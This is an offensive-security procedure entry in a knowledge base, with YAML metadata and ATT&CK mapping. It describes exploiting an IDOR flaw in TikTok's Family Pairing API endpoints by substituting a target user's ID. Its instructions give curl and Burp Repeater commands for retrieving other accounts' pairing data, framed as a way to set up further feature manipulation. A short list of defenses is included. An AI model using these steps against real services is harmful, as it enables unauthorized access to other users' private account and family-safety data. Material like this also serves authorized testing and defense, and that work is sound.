---
id: 123e4567-e89b-12d3-a456-426614174002
name: Manipulate-API-Parameters-for-Unauthorized-Access
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.409Z'
tactics:
  - '[[Discovery]]'
techniques:
  - '[[Account Discovery]]'
sub_techniques: []
tags:
  - idor
  - api
  - exploitation
commands:
  - '[[commands/curl-api-id-request]]'
platforms:
  - Web
  - API
tools:
  - '[[tools/Burp-Suite]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---

# Manipulate-API-Parameters-for-Unauthorized-Access

## Summary

This procedure tests IDOR by modifying API parameters in TikTok's Family Pairing endpoints to access other users' data, confirming unauthorized access without proper checks.

## Description

Once endpoints are identified, attackers replace user IDs in requests (e.g., from their own to a target's) to retrieve sensitive pairing information. This exploits the lack of ownership validation, allowing discovery of other accounts' configurations. In TikTok's case, this reveals family links and features, setting up further exploitation.

## Requirements

1. Captured API request from identification phase.
2. Known target user ID (e.g., from enumeration or public sources).
3. Valid auth token.
4. curl or Burp Repeater for request modification.

## Defense

Defensive measures and detection strategies:

- Enforce user-context validation on all API calls.
- Log and alert on ID mismatches between requester and target.
- Use session-based access controls.

## Objectives

1. Confirm IDOR by accessing unauthorized data.
2. Gather target user pairing details.
3. Prepare for feature manipulation.

## Instructions

### Step 1: Modify Request in Burp

**Context**: Use Burp Repeater to alter the user ID parameter.

**Command** ([[commands/curl-api-id-request]]):
```bash
curl -X POST 'https://api.tiktok.com/v1/family/pair/123456789' -H 'Authorization: Bearer YOUR_TOKEN' -d '{"action":"view"}'
```

> Replace 123456789 with target user ID. A successful response (200 OK with data) indicates IDOR.

### Step 2: Validate Access

**Context**: Check response for target-specific data.

**Command** ([[commands/curl-api-id-request]]):
```bash
curl -X GET 'https://api.tiktok.com/v1/family/pair/123456789' -H 'Authorization: Bearer YOUR_TOKEN'
```

> Expected output includes unauthorized pairing status.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-api-id-request]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[idor]]
- [[api]]
- [[exploitation]]
